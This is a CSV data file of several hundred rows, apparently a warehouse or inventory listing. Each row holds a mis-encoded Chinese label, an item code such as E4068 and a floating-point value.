' ½­Òõ¿â´æ,E3976,"",0.90300000000000002487
' ½­Òõ¿â´æ,E3977,"",0.96099999999999996536
' ½­Òõ¿â´æ,E3979,"",1.24100000000000010303
' ½­Òõ¿â´æ,E3980,"",0.56499999999999994671
' ½­Òõ¿â´æ,E3981,"",1.87799999999999989164
' ½­Òõ¿â´æ,E3982,"",0.62800000000000000266
' ½­Òõ¿â´æ,E3983,"",1.14799999999999990941
' ½­Òõ¿â´æ,E3984,"",1.12999999999999989342
' ½­Òõ¿â´æ,E3985,"",3.19799999999999995381
' ½­Òõ¿â´æ,E3986,"",0.53400000000000003020
' ½­Òõ¿â´æ,E3987,"",0.65900000000000003020
' ½­Òõ¿â´æ,E3989,"",1.01400000000000001243
' ½­Òõ¿â´æ,E3990,"",0.75400000000000000355
' ½­Òõ¿â´æ,E3991,"",2.06599999999999983658
' ½­Òõ¿â´æ,E3993,"",1.02099999999999990763
' ½­Òõ¿â´æ,E3994,"",0.76100000000000000977
' ½­Òõ¿â´æ,E3995,"",0.94199999999999994849
' ½­Òõ¿â´æ,E3996,"",0.94799999999999995381
' ½­Òõ¿â´æ,E4001,"",1.82299999999999995381
' ½­Òõ¿â´æ,E4002,"",2.12199999999999988631
' ½­Òõ¿â´æ,E4003,"",2.33300000000000018474
' ½­Òõ¿â´æ,E4004,"",4.02200000000000024158
' ½­Òõ¿â´æ,E4005,"",0.84799999999999997602
' ½­Òõ¿â´æ,E4006,"",0.58899999999999996803
' ½­Òõ¿â´æ,E4007,"",1.03600000000000003197
' ½­Òõ¿â´æ,E4009,"",1.11800000000000010481
' ½­Òõ¿â´æ,E4012,"",1.55099999999999993427
' ½­Òõ¿â´æ,E4013,"",1.55400000000000004796
' ½­Òõ¿â´æ,E4015,"",2.93900000000000005684
' ½­Òõ¿â´æ,E4016,"",3.34200000000000008171
' ½­Òõ¿â´æ,E4017,"",1.55400000000000004796
' ½­Òõ¿â´æ,E4018,"",1.55400000000000004796
' ½­Òõ¿â´æ,E4019,"",1.32699999999999995737
' ½­Òõ¿â´æ,E4020,"",1.32699999999999995737
' ½­Òõ¿â´æ,E4021,"",1.10099999999999997868
' ½­Òõ¿â´æ,E4022,"",0.83199999999999996181
' ½­Òõ¿â´æ,E4023,"",2.91400000000000014566
' ½­Òõ¿â´æ,E4025,"",0.90100000000000002309
' ½­Òõ¿â´æ,E4028,"",1.90900000000000003020
' ½­Òõ¿â´æ,E4029,"",0.86399999999999999023
' ½­Òõ¿â´æ,E4030,"",0.53400000000000003020
' ½­Òõ¿â´æ,E4033,"",2.10599999999999987210
' ½­Òõ¿â´æ,E4034,"",0.75400000000000000355
' ½­Òõ¿â´æ,E4035,"",1.25600000000000000533
' ½­Òõ¿â´æ,E4036,"",1.25600000000000000533
' ½­Òõ¿â´æ,E4038,"",0.88300000000000000711
' ½­Òõ¿â´æ,E4039,"",1.09899999999999997691
' ½­Òõ¿â´æ,E4040,"",1.31899999999999995026
' ½­Òõ¿â´æ,E4041,"",2.31400000000000005684
' ½­Òõ¿â´æ,E4042,"",1.25600000000000000533
' ½­Òõ¿â´æ,E4043,"",4.66899999999999959499
' ½­Òõ¿â´æ,E4044,"",2.83199999999999985079
' ½­Òõ¿â´æ,E4045,"",3.76299999999999990052
' ½­Òõ¿â´æ,E4047,"",1.32699999999999995737
' ½­Òõ¿â´æ,E4048,"",1.32699999999999995737
' ½­Òõ¿â´æ,E4049,"",1.32699999999999995737
' ½­Òõ¿â´æ,E4050,"",1.32699999999999995737
' ½­Òõ¿â´æ,E4051,"",1.32699999999999995737
' ½­Òõ¿â´æ,E4053,"",1.08699999999999996625
' ½­Òõ¿â´æ,E4054,"",1.12099999999999999645
' ½­Òõ¿â´æ,E4056,"",4.36099999999999976552
' ½­Òõ¿â´æ,E4059,"",7.23299999999999965183
' ½­Òõ¿â´æ,E4061,"",1.34699999999999997513
' ½­Òõ¿â´æ,E4062,"",4.00800000000000000711
' ½­Òõ¿â´æ,E4063,"",1.00499999999999989342
' ½­Òõ¿â´æ,E4065,"",0.87900000000000000355
' ½­Òõ¿â´æ,E4066,"",4.87699999999999977973
' ½­Òõ¿â´æ,E4068,"",14.86899999999999977263
' ½­Òõ¿â´æ,E4069,"",0.66300000000000003375
' ½­Òõ¿â´æ,E4070,"",3.24599999999999999645
' ½­Òõ¿â´æ,E4071,"",0.90400000000000002576
' ½­Òõ¿â´æ,E4072,"",0.86399999999999999023
' ½­Òõ¿â´æ,E4074,"",4.43299999999999982947
' ½­Òõ¿â´æ,E4075,"",2.74800000000000022027
' ½­Òõ¿â´æ,E4076,"",3.72800000000000020250
' ½­Òõ¿â´æ,E4078,"",0.82099999999999995204
' ½­Òõ¿â´æ,E4079,"",23.94300000000000139266
' ½­Òõ¿â´æ,E4080,"",6.90099999999999980105
' ½­Òõ¿â´æ,E4081,"",0.34599999999999997424
' ½­Òõ¿â´æ,E4083,"",1.24799999999999999822
' ½­Òõ¿â´æ,E4084,"",0.76700000000000001510
' ½­Òõ¿â´æ,E4085,"",1.74399999999999999467
' ½­Òõ¿â´æ,E4086,"",1.32699999999999995737
' ½­Òõ¿â´æ,E4087,"",1.22500000000000008882
' ½­Òõ¿â´æ,E4088,"",2.02800000000000002487
' ½­Òõ¿â´æ,E4089,"",1.48799999999999998934
' ½­Òõ¿â´æ,E4091,"",2.02800000000000002487
' ½­Òõ¿â´æ,E4092,"",2.02800000000000002487
' ½­Òõ¿â´æ,E4094,"",2.05100000000000015632
' ½­Òõ¿â´æ,E4097,"",1.37900000000000000355
' ½­Òõ¿â´æ,E4098,"",3.76900000000000012790
' ½­Òõ¿â´æ,E4099,"",14.86400000000000076739
' ½­Òõ¿â´æ,E4100,"",0.93300000000000005151
' ½­Òõ¿â´æ,E4101,"",1.01200000000000001066
' ½­Òõ¿â´æ,E4104,"",0.73599999999999998757
' ½­Òõ¿â´æ,B4105,"",9.52999999999999936051
' ½­Òõ¿â´æ,E4105,"",0.74799999999999999822
' ½­Òõ¿â´æ,B4106,"",9.52999999999999936051
' ½­Òõ¿â´æ,E4106,"",0.72699999999999997957
' ½­Òõ¿â´æ,E4107,"",1.99399999999999999467
' ½­Òõ¿â´æ,E4108,"",1.22500000000000008882
' ½­Òõ¿â´æ,E4109,"",6.24099999999999965894
' ½­Òõ¿â´æ,E4112,"",1.05400000000000004796
' ½­Òõ¿â´æ,E4113,"",0.97299999999999997602
' ½­Òõ¿â´æ,E4114,"",0.54700000000000004174
' ½­Òõ¿â´æ,E4115,"",0.63300000000000000711
' ½­Òõ¿â´æ,E4116,"",0.74899999999999999911
' ½­Òõ¿â´æ,E4117,"",0.75600000000000000533
' ½­Òõ¿â´æ,E4118,"",0.46899999999999997247
' ½­Òõ¿â´æ,E4119,"",0.63300000000000000711
' ½­Òõ¿â´æ,E4120,"",4.14499999999999957367
' ½­Òõ¿â´æ,E4122,"",5.42799999999999993605
' ½­Òõ¿â´æ,E4123,"",4.20300000000000029132
' ½­Òõ¿â´æ,E4124,"",8.72899999999999920419
' ½­Òõ¿â´æ,E4125,"",8.72899999999999920419
' ½­Òõ¿â´æ,E4126,"",5.80100000000000015632
' ½­Òõ¿â´æ,E4127,"",0.89600000000000001865
' ½­Òõ¿â´æ,E4128,"",4.69700000000000006395
' ½­Òõ¿â´æ,E4129,"",5.00800000000000000711
' ½­Òõ¿â´æ,E4130,"",3.63899999999999979039
' ½­Òõ¿â´æ,E4132,"",2.53200000000000002842
' ½­Òõ¿â´æ,E4133,"",2.75300000000000011369
' ½­Òõ¿â´æ,E4134,"",7.97900000000000009237
' ½­Òõ¿â´æ,E4135,"",1.12700000000000000178
' ½­Òõ¿â´æ,E4136,"",1.12700000000000000178
' ½­Òõ¿â´æ,E4137,"",0.84799999999999997602
' ½­Òõ¿â´æ,E4139,"",0.82399999999999995470
' ½­Òõ¿â´æ,E4140,"",0.85399999999999998135
' ½­Òõ¿â´æ,E4141,"",1.08800000000000007816
' ½­Òõ¿â´æ,E4142,"",0.89700000000000001954
' ½­Òõ¿â´æ,E4143,"",22.66199999999999903366
' ½­Òõ¿â´æ,E4144,"",1.98700000000000009948
' ½­Òõ¿â´æ,E4146,"",3.27300000000000013145
' ½­Òõ¿â´æ,E4147,"",1.31899999999999995026
' ½­Òõ¿â´æ,E4148,"",1.09899999999999997691
' ½­Òõ¿â´æ,E4149,"",1.31899999999999995026
' ½­Òõ¿â´æ,E4150,"",2.97900000000000009237
' ½­Òõ¿â´æ,E4151,"",4.08399999999999963052
' ½­Òõ¿â´æ,E4152,"",1.00699999999999989519
' ½­Òõ¿â´æ,E4153,"",0.85399999999999998135
' ½­Òõ¿â´æ,E4154,"",0.81599999999999994760
' ½­Òõ¿â´æ,E4155,"",2.19300000000000006040
' ½­Òõ¿â´æ,E4157,"",1.55400000000000004796
' ½­Òõ¿â´æ,E4158,"",0.67800000000000004707
' ½­Òõ¿â´æ,E4159,"",0.96699999999999997069
' ½­Òõ¿â´æ,E4160,"",0.80100000000000004530
' ½­Òõ¿â´æ,E4163,"",6.78200000000000002842
' ½­Òõ¿â´æ,E4165,"",5.52799999999999958078
' ½­Òõ¿â´æ,E4167,"",1.61200000000000009948
' ½­Òõ¿â´æ,E4168,"",3.41900000000000003908
' ½­Òõ¿â´æ,E4169,"",4.97299999999999986500
' ½­Òõ¿â´æ,E4170,"",13.73799999999999954525
' ½­Òõ¿â´æ,E4171,"",4.61599999999999965894
' ½­Òõ¿â´æ,E4172,"",6.92400000000000037659
' ½­Òõ¿â´æ,E4173,"",3.19799999999999995381
' ½­Òõ¿â´æ,E4175,"",7.44800000000000039790
' ½­Òõ¿â´æ,E4176,"",1.63199999999999989519
' ½­Òõ¿â´æ,E4177,"",1.01299999999999990052
' ½­Òõ¿â´æ,E4178,"",1.01299999999999990052
' ½­Òõ¿â´æ,E4179,"",1.49199999999999999289
' ½­Òõ¿â´æ,E4180,"",2.21399999999999996803
' ½­Òõ¿â´æ,E4181,"",1.97799999999999998046
' ½­Òõ¿â´æ,E4182,"",3.49699999999999988631
' ½­Òõ¿â´æ,E4183,"",14.24799999999999933209
' ½­Òõ¿â´æ,E4184,"",20.08200000000000073896
' ½­Òõ¿â´æ,E4185,"",4.20300000000000029132
' ½­Òõ¿â´æ,E4186,"",0.62199999999999999734
' ½­Òõ¿â´æ,E4187,"",0.56299999999999994493
' ½­Òõ¿â´æ,E4188,"",0.59899999999999997691
' ½­Òõ¿â´æ,E4189,"",0.50200000000000000178
' ½­Òõ¿â´æ,E4191,"",0.50900000000000000799
' ½­Òõ¿â´æ,E4192,"",0.53400000000000003020
' ½­Òõ¿â´æ,E4193,"",0.66100000000000003197
' ½­Òõ¿â´æ,E4194,"",0.54700000000000004174
' ½­Òõ¿â´æ,E4195,"",0.38400000000000000799
' ½­Òõ¿â´æ,E4196,"",0.81100000000000005418
' ½­Òõ¿â´æ,E4197,"",0.79100000000000003642
' ½­Òõ¿â´æ,E4198,"",0.64100000000000001421
' ½­Òõ¿â´æ,E4200,"",0.68700000000000005507
' ½­Òõ¿â´æ,E4203,"",2.91699999999999981526
' ½­Òõ¿â´æ,E4204,"",0.73599999999999998757
' ½­Òõ¿â´æ,E4206,"",5.99300000000000032685
' ½­Òõ¿â´æ,E4207,"",2.44899999999999984368
' ½­Òõ¿â´æ,E4208,"",1.01299999999999990052
' ½­Òõ¿â´æ,E4209,"",1.49199999999999999289
' ½­Òõ¿â´æ,E4210,"",5.39799999999999968736
' ½­Òõ¿â´æ,E4211,"",1.49199999999999999289
' ½­Òõ¿â´æ,E4213,"",20.11599999999999965894
' ½­Òõ¿â´æ,E4215,"",2.08599999999999985434
' ½­Òõ¿â´æ,E4217,"",17.13500000000000156319
' ½­Òõ¿â´æ,E4218,"",1.56400000000000005684
' ½­Òõ¿â´æ,E4219,"",4.23399999999999998579
' ½­Òõ¿â´æ,E4220,"",1.56200000000000005507
' ½­Òõ¿â´æ,E4221,"",1.01400000000000001243
' ½­Òõ¿â´æ,E4222,"",0.86299999999999998934
' ½­Òõ¿â´æ,E4223,"",1.59200000000000008171
' ½­Òõ¿â´æ,E4224,"",2.32799999999999984723
' ½­Òõ¿â´æ,E4225,"",4.07200000000000006395
' ½­Òõ¿â´æ,E4226,"",2.27300000000000013145
' ½­Òõ¿â´æ,E4229,"",3.75899999999999989697
' ½­Òõ¿â´æ,E4230,"",9.57399999999999984368
' ½­Òõ¿â´æ,E4231,"",9.39899999999999913314
' ½­Òõ¿â´æ,E4232,"",7.84799999999999986500
' ½­Òõ¿â´æ,E4233,"",3.27800000000000002487
' ½­Òõ¿â´æ,E4234,"",0.56100000000000005418
' ½­Òõ¿â´æ,E4235,"",3.16800000000000014921
' ½­Òõ¿â´æ,E4236,"",0.63200000000000000622
' ½­Òõ¿â´æ,E4238,"",0.76400000000000001243
' ½­Òõ¿â´æ,E4240,"",0.60299999999999998046
' ½­Òõ¿â´æ,E4241,"",1.01200000000000001066
' ½­Òõ¿â´æ,E4242,"",0.60099999999999997868
' ½­Òõ¿â´æ,E4243,"",1.09899999999999997691
' ½­Òõ¿â´æ,E4244,"",1.12999999999999989342
' ½­Òõ¿â´æ,E4245,"",0.98899999999999999023
' ½­Òõ¿â´æ,E4246,"",0.97299999999999997602
' ½­Òõ¿â´æ,E4247,"",0.97299999999999997602
' ½­Òõ¿â´æ,E4248,"",1.09899999999999997691
' ½­Òõ¿â´æ,E4249,"",0.97299999999999997602
' ½­Òõ¿â´æ,E4250,"",1.16700000000000003730
' ½­Òõ¿â´æ,E4251,"",1.03099999999999991651
' ½­Òõ¿â´æ,E4252,"",0.87299999999999999822
' ½­Òõ¿â´æ,E4253,"",5.53399999999999980815
' ½­Òõ¿â´æ,E4254,"",0.66800000000000003819
' ½­Òõ¿â´æ,E4255,"",0.56499999999999994671
' ½­Òõ¿â´æ,E4256,"",0.50900000000000000799
' ½­Òõ¿â´æ,E4257,"",0.75600000000000000533
' ½­Òõ¿â´æ,E4258,"",0.50200000000000000178
' ½­Òõ¿â´æ,E4259,"",0.49199999999999999289
' ½­Òõ¿â´æ,E4260,"",1.01699999999999990408
' ½­Òõ¿â´æ,E4261,"",0.39600000000000001865
' ½­Òõ¿â´æ,E4262,"",0.62199999999999999734
' ½­Òõ¿â´æ,E4263,"",0.97899999999999998135
' ½­Òõ¿â´æ,E4265,"",14.08300000000000018474
' ½­Òõ¿â´æ,E4267,"",4.34199999999999963762
' ½­Òõ¿â´æ,E4268,"",1.05800000000000005151
' ½­Òõ¿â´æ,E4269,"",0.72299999999999997602
' ½­Òõ¿â´æ,E4270,"",0.63300000000000000711
' ½­Òõ¿â´æ,E4271,"",0.93300000000000005151
' ½­Òõ¿â´æ,E4272,"",0.93300000000000005151
' ½­Òõ¿â´æ,E4274,"",12.05799999999999982947
' ½­Òõ¿â´æ,E4275,"",0.53700000000000003286
' ½­Òõ¿â´æ,E4277,"",1.76800000000000001599
' ½­Òõ¿â´æ,E4278,"",1.24300000000000010481
' ½­Òõ¿â´æ,E4279,"",25.15700000000000002842
' ½­Òõ¿â´æ,E4280,"",22.66199999999999903366
' ½­Òõ¿â´æ,E4281,"",0.45200000000000001288
' ½­Òõ¿â´æ,E4282,"",0.83699999999999996625
' ½­Òõ¿â´æ,E4283,"",0.62199999999999999734
' ½­Òõ¿â´æ,E4284,"",0.72099999999999997424
' ½­Òõ¿â´æ,E4285,"",0.93300000000000005151
' ½­Òõ¿â´æ,B4286,"",32.79999999999999715783
' ½­Òõ¿â´æ,E4286,"",8.86100000000000065370
' ½­Òõ¿â´æ,E4289,"",20.02199999999999846523
' ½­Òõ¿â´æ,E4290,"",23.01099999999999923261
' ½­Òõ¿â´æ,E4292,"",1.14100000000000001421
' ½­Òõ¿â´æ,E4293,"",1.81899999999999995026
' ½­Òõ¿â´æ,E4295,"",0.72099999999999997424
' ½­Òõ¿â´æ,E4296,"",0.56499999999999994671
' ½­Òõ¿â´æ,E4298,"",0.59899999999999997691
' ½­Òõ¿â´æ,E4299,"",0.63300000000000000711
' ½­Òõ¿â´æ,E4301,"",1.24799999999999999822
' ½­Òõ¿â´æ,E4303,"",0.63400000000000000799
' ½­Òõ¿â´æ,E4305,"",1.17300000000000004263
' ½­Òõ¿â´æ,E4307,"",0.68799999999999994493
' ½­Òõ¿â´æ,E4308,"",5.18700000000000027711
' ½­Òõ¿â´æ,E4310,"",2.49900000000000011013
' ½­Òõ¿â´æ,E4311,"",1.04899999999999993250
' ½­Òõ¿â´æ,E4312,"",0.91700000000000003730
' ½­Òõ¿â´æ,E4313,"",1.42100000000000004086
' ½­Òõ¿â´æ,E4315,"",5.09900000000000019895
' ½­Òõ¿â´æ,E4316,"",6.90899999999999980815
' ½­Òõ¿â´æ,E4317,"",1.09200000000000008171
' ½­Òõ¿â´æ,E4318,"",0.55000000000000004441
' ½­Òõ¿â´æ,E4319,"",1.03600000000000003197
' ½­Òõ¿â´æ,E4320,"",0.59299999999999997158
' ½­Òõ¿â´æ,E4321,"",1.40900000000000003020
' ½­Òõ¿â´æ,E4322,"",0.72299999999999997602
' ½­Òõ¿â´æ,E4323,"",1.64900000000000002132
' ½­Òõ¿â´æ,E4324,"",2.79300000000000014921
' ½­Òõ¿â´æ,E4326,"",5.56799999999999961631
' ½­Òõ¿â´æ,E4327,"",6.14400000000000012790
' ½­Òõ¿â´æ,E4328,"",0.97299999999999997602
' ½­Òõ¿â´æ,E4329,"",4.65299999999999958078
' ½­Òõ¿â´æ,E4330,"",1.32600000000000006750
' ½­Òõ¿â´æ,E4331,"",2.45900000000000007461
' ½­Òõ¿â´æ,E4332,"",1.64300000000000001599
' ½­Òõ¿â´æ,E4333,"",14.60100000000000086686
' ½­Òõ¿â´æ,E4334,"",0.93300000000000005151
' ½­Òõ¿â´æ,E4336,"",2.56300000000000016698
' ½­Òõ¿â´æ,E4337,"",1.63799999999999990052
' ½­Òõ¿â´æ,E4338,"",6.92400000000000037659
' ½­Òõ¿â´æ,E4339,"",3.39100000000000001421
' ½­Òõ¿â´æ,E4340,"",2.57900000000000018119
' ½­Òõ¿â´æ,E4341,"",4.70600000000000040501
' ½­Òõ¿â´æ,E4342,"",2.49000000000000021316
' ½­Òõ¿â´æ,E4344,"",5.80299999999999993605
' ½­Òõ¿â´æ,E4345,"",1.02899999999999991473
' ½­Òõ¿â´æ,E4346,"",10.60800000000000054001
' ½­Òõ¿â´æ,E4347,"",9.44999999999999928946
' ½­Òõ¿â´æ,E4348,"",5.92799999999999993605
' ½­Òõ¿â´æ,E4349,"",14.24799999999999933209
' ½­Òõ¿â´æ,E4350,"",20.11599999999999965894
' ½­Òõ¿â´æ,E4352,"",1.31299999999999994493
' ½­Òõ¿â´æ,E4353,"",3.46200000000000018829
' ½­Òõ¿â´æ,E4356,"",4.75100000000000033396
' ½­Òõ¿â´æ,E4359,"",1.25600000000000000533
' ½­Òõ¿â´æ,E4360,"",1.59099999999999996980
' ½­Òõ¿â´æ,E4361,"",1.14599999999999990763
' ½­Òõ¿â´æ,E4362,"",12.53800000000000025580
' ½­Òõ¿â´æ,E4363,"",12.24600000000000044054
' ½­Òõ¿â´æ,E4364,"",22.92399999999999948841
' ½­Òõ¿â´æ,E4365,"",1.88300000000000000711
' ½­Òõ¿â´æ,E4366,"",1.88300000000000000711
' ½­Òõ¿â´æ,E4367,"",1.88300000000000000711
' ½­Òõ¿â´æ,E4368,"",1.88300000000000000711
' ½­Òõ¿â´æ,E4369,"",0.84799999999999997602
' ½­Òõ¿â´æ,E4370,"",2.47599999999999997868
' ½­Òõ¿â´æ,E4371,"",1.94599999999999995204
' ½­Òõ¿â´æ,E4372,"",1.88300000000000000711
' ½­Òõ¿â´æ,E4373,"",1.88300000000000000711
' ½­Òõ¿â´æ,E4374,"",1.88300000000000000711
' ½­Òõ¿â´æ,E4375,"",1.88300000000000000711
' ½­Òõ¿â´æ,E4376,"",1.00200000000000000178
' ½­Òõ¿â´æ,E4377,"",1.59099999999999996980
' ½­Òõ¿â´æ,E4378,"",1.12999999999999989342
' ½­Òõ¿â´æ,E4379,"",1.12799999999999989164
' ½­Òõ¿â´æ,E4380,"",2.86100000000000020961
' ½­Òõ¿â´æ,E4381,"",6.44599999999999972999
' ½­Òõ¿â´æ,E4383,"",2.26100000000000012079
' ½­Òõ¿â´æ,E4384,"",1.85200000000000009059
' ½­Òõ¿â´æ,E4387,"",4.53699999999999992184
' ½­Òõ¿â´æ,E4388,"",6.29100000000000036948
' ½­Òõ¿â´æ,E4389,"",5.92799999999999993605
' ½­Òõ¿â´æ,E4390,"",7.47599999999999997868
' ½­Òõ¿â´æ,E4391,"",2.10099999999999997868
' ½­Òõ¿â´æ,E4393,"",8.72899999999999920419
' ½­Òõ¿â´æ,E4394,"",5.92799999999999993605
' ½­Òõ¿â´æ,E4396,"",9.23300000000000054001
' ½­Òõ¿â´æ,E4397,"",9.23300000000000054001
' ½­Òõ¿â´æ,E4398,"",1.51699999999999990408
' ½­Òõ¿â´æ,E4400,"",4.03899999999999970157
' ½­Òõ¿â´æ,E4401,"",4.02200000000000024158
' ½­Òõ¿â´æ,E4402,"",6.10799999999999965183
' ½­Òõ¿â´æ,E4403,"",1.48399999999999998579
' ½­Òõ¿â´æ,E4404,"",2.44899999999999984368
' ½­Òõ¿â´æ,E4405,"",4.97799999999999975842
' ½­Òõ¿â´æ,E4406,"",1.49199999999999999289
' ½­Òõ¿â´æ,E4407,"",1.49199999999999999289
' ½­Òõ¿â´æ,E4408,"",4.53699999999999992184
' ½­Òõ¿â´æ,E4409,"",2.21399999999999996803
' ½­Òõ¿â´æ,E4410,"",7.84799999999999986500
' ½­Òõ¿â´æ,E4411,"",7.97900000000000009237
' ½­Òõ¿â´æ,E4412,"",2.44899999999999984368
' ½­Òõ¿â´æ,E4413,"",2.44899999999999984368
' ½­Òõ¿â´æ,E4414,"",6.29100000000000036948
' ½­Òõ¿â´æ,E4417,"",5.65800000000000036238
' ½­Òõ¿â´æ,E4418,"",1.01099999999999989875
' ½­Òõ¿â´æ,E4419,"",1.47900000000000009237
' ½­Òõ¿â´æ,E4420,"",3.02700000000000013500
' ½­Òõ¿â´æ,E4421,"",1.53899999999999992362
' ½­Òõ¿â´æ,E4422,"",3.21899999999999986144
' ½­Òõ¿â´æ,E4423,"",1.46199999999999996625
' ½­Òõ¿â´æ,E4424,"",2.88300000000000000711
' ½­Òõ¿â´æ,E4425,"",2.86600000000000010303
' ½­Òõ¿â´æ,E4426,"",2.59900000000000019895
' ½­Òõ¿â´æ,E4429,"",2.40099999999999980105
' ½­Òõ¿â´æ,E4430,"",1.18599999999999994316
' ½­Òõ¿â´æ,E4431,"",2.62800000000000011369
' ½­Òõ¿â´æ,E4432,"",1.49199999999999999289
' ½­Òõ¿â´æ,E4433,"",1.65799999999999991829
' ½­Òõ¿â´æ,E4434,"",1.54099999999999992539
' ½­Òõ¿â´æ,E4435,"",20.61799999999999855049
' ½­Òõ¿â´æ,E4436,"",9.44599999999999972999
' ½­Òõ¿â´æ,E4437,"",6.97900000000000009237
' ½­Òõ¿â´æ,E4438,"",9.23300000000000054001
' ½­Òõ¿â´æ,E4439,"",6.06599999999999983658
' ½­Òõ¿â´æ,E4440,"",0.52800000000000002487
' ½­Òõ¿â´æ,E4441,"",0.54500000000000003997
' ½­Òõ¿â´æ,E4442,"",1.45300000000000006928
' ½­Òõ¿â´æ,E4443,"",0.78100000000000002753
' ½­Òõ¿â´æ,E4444,"",0.77100000000000001865
' ½­Òõ¿â´æ,E4445,"",1.59200000000000008171
' ½­Òõ¿â´æ,E4446,"",6.59400000000000030553
' ½­Òõ¿â´æ,E4447,"",7.42799999999999993605
' ½­Òõ¿â´æ,E4448,"",2.29800000000000004263
' ½­Òõ¿â´æ,E4449,"",6.42900000000000027001
' ½­Òõ¿â´æ,E4450,"",2.83800000000000007816
' ½­Òõ¿â´æ,E4451,"",1.94599999999999995204
' ½­Òõ¿â´æ,E4452,"",1.83800000000000007816
' ½­Òõ¿â´æ,E4453,"",2.51799999999999979394
' ½­Òõ¿â´æ,E4455,"",7.59700000000000041922
' ½­Òõ¿â´æ,E4456,"",5.97299999999999986500
' ½­Òõ¿â´æ,E4457,"",2.13899999999999979039
' ½­Òõ¿â´æ,E4458,"",2.26200000000000001066
' ½­Òõ¿â´æ,E4460,"",4.60599999999999987210
' ½­Òõ¿â´æ,E4461,"",1.04600000000000004086
' ½­Òõ¿â´æ,E4462,"",1.00499999999999989342
' ½­Òõ¿â´æ,E4463,"",1.09899999999999997691
' ½­Òõ¿â´æ,E4464,"",4.72299999999999986500
' ½­Òõ¿â´æ,E4465,"",1.06099999999999994316
' ½­Òõ¿â´æ,E4466,"",1.03600000000000003197
' ½­Òõ¿â´æ,E4467,"",1.03899999999999992362
' ½­Òõ¿â´æ,E4469,"",5.75399999999999955946
' ½­Òõ¿â´æ,E4470,"",2.30799999999999982947
' ½­Òõ¿â´æ,E4471,"",1.95799999999999996270
' ½­Òõ¿â´æ,E4472,"",0.52800000000000002487
' ½­Òõ¿â´æ,E4473,"",0.68200000000000005063
' ½­Òõ¿â´æ,E4474,"",0.92600000000000004530
' ½­Òõ¿â´æ,E4475,"",1.83600000000000007638
' ½­Òõ¿â´æ,E4477,"",0.60899999999999998579
' ½­Òõ¿â´æ,E4478,"",0.95099999999999995648
' ½­Òõ¿â´æ,E4479,"",1.52299999999999990941
' ½­Òõ¿â´æ,E4480,"",1.31899999999999995026
' ½­Òõ¿â´æ,E4481,"",9.78299999999999947420
' ½­Òõ¿â´æ,E4483,"",0.65100000000000002309
' ½­Òõ¿â´æ,E4484,"",0.63300000000000000711
' ½­Òõ¿â´æ,E4485,"",0.59299999999999997158
' ½­Òõ¿â´æ,E4486,"",0.78100000000000002753
' ½­Òõ¿â´æ,E4487,"",0.71199999999999996625
' ½­Òõ¿â´æ,E4488,"",1.39399999999999990585
' ½­Òõ¿â´æ,E4489,"",0.94199999999999994849
' ½­Òõ¿â´æ,E4491,"",7.97900000000000009237
' ½­Òõ¿â´æ,E4492,"",3.20299999999999984723
' ½­Òõ¿â´æ,E4493,"",1.68399999999999994138
' ½­Òõ¿â´æ,E4494,"",3.06199999999999983302
' ½­Òõ¿â´æ,E4495,"",4.78399999999999980815
' ½­Òõ¿â´æ,E4497,"",0.69199999999999994849
' ½­Òõ¿â´æ,E4498,"",0.70199999999999995737
' ½­Òõ¿â´æ,E4499,"",0.79100000000000003642
' ½­Òõ¿â´æ,E4500,"",1.35400000000000009237
' ½­Òõ¿â´æ,E4501,"",1.17399999999999993250
' ½­Òõ¿â´æ,E4503,"",8.43800000000000061107
' ½­Òõ¿â´æ,E4504,"",1.21399999999999996803
' ½­Òõ¿â´æ,E4505,"",1.50699999999999989519
' ½­Òõ¿â´æ,E4506,"",0.87900000000000000355
' ½­Òõ¿â´æ,E4507,"",8.69999999999999928946
' ½­Òõ¿â´æ,E4508,"",9.23300000000000054001
' ½­Òõ¿â´æ,E4509,"",4.43299999999999982947
' ½­Òõ¿â´æ,E4512,"",0.73399999999999998579
' ½­Òõ¿â´æ,E4514,"",1.88300000000000000711
' ½­Òõ¿â´æ,E4515,"",0.98899999999999999023
' ½­Òõ¿â´æ,E4516,"",1.88300000000000000711
' ½­Òõ¿â´æ,E4517,"",1.88300000000000000711
' ½­Òõ¿â´æ,E4518,"",1.88300000000000000711
' ½­Òõ¿â´æ,E4519,"",1.88300000000000000711
' ½­Òõ¿â´æ,E4520,"",1.43799999999999994493
' ½­Òõ¿â´æ,E4521,"",7.02400000000000002132
' ½­Òõ¿â´æ,E4522,"",9.23300000000000054001
' ½­Òõ¿â´æ,E4523,"",2.93599999999999994316
' ½­Òõ¿â´æ,E4524,"",0.60299999999999998046
' ½­Òõ¿â´æ,E4526,"",1.88300000000000000711
' ½­Òõ¿â´æ,E4527,"",1.88300000000000000711
' ½­Òõ¿â´æ,E4528,"",0.78600000000000003197
' ½­Òõ¿â´æ,E4529,"",1.47100000000000008527
' ½­Òõ¿â´æ,E4530,"",1.55099999999999993427
' ½­Òõ¿â´æ,E4533,"",2.19499999999999984013
' ½­Òõ¿â´æ,E4534,"",1.88300000000000000711
' ½­Òõ¿â´æ,E4535,"",1.88300000000000000711
' ½­Òõ¿â´æ,E4538,"",5.02599999999999980105
' ½­Òõ¿â´æ,E4539,"",9.23300000000000054001
' ½­Òõ¿â´æ,E4540,"",1.24599999999999999645
' ½­Òõ¿â´æ,E4541,"",2.96099999999999985434
' ½­Òõ¿â´æ,E4542,"",1.49100000000000010303
' ½­Òõ¿â´æ,E4543,"",0.87600000000000000089
' ½­Òõ¿â´æ,E4545,"",1.39900000000000002132
' ½­Òõ¿â´æ,E4546,"",0.90200000000000002398
' ½­Òõ¿â´æ,E4547,"",2.18400000000000016342
' ½­Òõ¿â´æ,E4548,"",1.35899999999999998579
' ½­Òõ¿â´æ,E4549,"",4.02700000000000013500
' ½­Òõ¿â´æ,E4551,"",5.80600000000000004974
' ½­Òõ¿â´æ,E4552,"",1.57099999999999995204
' ½­Òõ¿â´æ,E4556,"",1.81299999999999994493
' ½­Òõ¿â´æ,E4557,"",1.76600000000000001421
' ½­Òõ¿â´æ,E4558,"",7.12899999999999955946
' ½­Òõ¿â´æ,E4559,"",0.87900000000000000355
' ½­Òõ¿â´æ,E4560,"",1.16399999999999992362
' ½­Òõ¿â´æ,E4561,"",1.12999999999999989342
' ½­Òõ¿â´æ,E4562,"",0.88300000000000000711
' ½­Òõ¿â´æ,E4563,"",1.47900000000000009237
' ½­Òõ¿â´æ,E4564,"",2.82600000000000006750
' ½­Òõ¿â´æ,E4565,"",0.85199999999999997957
' ½­Òõ¿â´æ,E4566,"",3.48899999999999987921
' ½­Òõ¿â´æ,E4572,"",1.07699999999999995737
